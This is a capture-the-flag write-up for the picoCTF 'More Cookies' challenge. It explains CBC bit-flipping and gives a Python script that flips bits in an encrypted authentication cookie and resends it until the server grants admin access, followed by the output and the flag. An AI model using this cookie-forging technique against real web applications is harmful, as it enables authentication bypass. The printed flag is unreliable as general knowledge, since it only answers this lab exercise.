# picoGym Level 124: More Cookies
Source: https://play.picoctf.org/practice/challenge/124

## Goal
I forgot Cookies can Be modified Client-side, so now I decided to encrypt them!<br>
http://mercury.picoctf.net:10868/

## What I learned
```
Cipher Block Chaining (CBC) is a mode of operation for block ciphers (like AES, DES).
It’s a way of using a block cipher to encrypt data longer than a single block (files, messages).

Bit-flipping attack = modify ciphertext bits → predictable flips in decrypted plaintext.
```             

## Solution
```
https://webshell.picoctf.org/

# View Page Source
<!DOCTYPE html>
<html lang="en">

<head>
    <title>More Cookies</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body>
    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Reset</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">More Cookies</h3>
        </div>
        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->
      <div class="jumbotron">
        <p class="lead"></p>
		<div class="row">
			<div class="col-xs-12 col-sm-12 col-md-12">
				<h3>Welcome to my cookie search page. Only the admin can use it!</h3>
			</div>
		</div>
		<br/>
        <div class="login-form">
		</div>
	</div>
    <footer class="footer">
        <p>&copy; PicoCTF</p>
    </footer>
</div>

<script>
$(document).ready(function(){
    $(".close").click(function(){
        $("myAlert").alert("close");
    });
});
</script>
</body>

</html>

# Create Payload script to change 1 bit at time to find admin bit
AsianHacker-picoctf@webshell:~$ cd /tmp/ ⌨️
AsianHacker-picoctf@webshell:/tmp$ vi script.py ⌨️
AsianHacker-picoctf@webshell:/tmp$ cat script.py ⌨️
#!/usr/bin/python3
import requests
import base64

s = requests.Session()
s.get("http://mercury.picoctf.net:10868/")
cookie = s.cookies["auth_name"]
print(cookie)

unb64 = base64.b64decode(cookie)
print(unb64)

unb64b = base64.b64decode(unb64)

for i in range(0, 128):
    pos = i // 8
    # Flip one bit in the pos-th byte
    guessdec = (
        unb64b[0:pos]
        + ((unb64b[pos] ^ (1 << (i % 8))).to_bytes(1, "big"))
        + unb64b[pos + 1 :]
    )
    guessenc1 = base64.b64encode(guessdec)
    guess = base64.b64encode(guessenc1).decode()

    r = requests.get(
        "http://mercury.picoctf.net:10868/", cookies={"auth_name": guess}
    )
    if "pico" in r.text:
        print(r.text)

AsianHacker-picoctf@webshell:/tmp$ python3 script.py ⌨️
ODgzNUhBeW9lZjBvalVzQzJCNllFTGIyOUF6SkZZVFYzbjNETnpYa1FrbXRsaWViWUxUQVV6dDJRdXdUQWxFMFBsR1g0TlA5TjdPcm5qVC9FYjgwYk04dFArQkwydmpKN3dxcUlBSDV0MmdOeHJMVmg4OURFYWF3L2xPeTZSRWw=
b'8835HAyoef0ojUsC2B6YELb29AzJFYTV3n3DNzXkQkmtliebYLTAUzt2QuwTAlE0PlGX4NP9N7OrnjT/Eb80bM8tP+BL2vjJ7wqqIAH5t2gNxrLVh89DEaaw/lOy6REl'
<!DOCTYPE html>
<html lang="en">

<head>
    <title>More Cookies</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Reset</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">More Cookies</h3>
        </div>
        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{cO0ki3s_yum_e57b2438}</code></p> 🔐
        </div>
        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>
    </div>
</body>
</html>

# Method 2: Burp Suite using Intruder
```

## Flag
picoCTF{cO0ki3s_yum_e57b2438}

## Continue
[Continue](./picoGym0069.md)